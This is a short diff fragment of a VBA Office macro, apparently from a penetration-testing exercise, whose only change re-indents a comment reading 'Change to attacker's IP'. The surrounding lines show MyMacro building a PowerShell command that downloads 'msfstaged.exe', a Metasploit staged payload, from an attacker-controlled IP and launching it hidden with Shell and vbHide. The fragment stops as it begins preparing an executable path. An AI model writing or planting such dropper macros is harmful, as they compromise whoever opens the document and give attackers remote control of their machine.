@@ -8,7 +8,7 @@ End Sub
 
 Sub MyMacro()
     Dim str As String
-		' Change to attacker's IP
+    ' Change to attacker's IP
     str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.45.195/msfstaged.exe', 'msfstaged.exe')"
     Shell str, vbHide
     Dim exePath As String
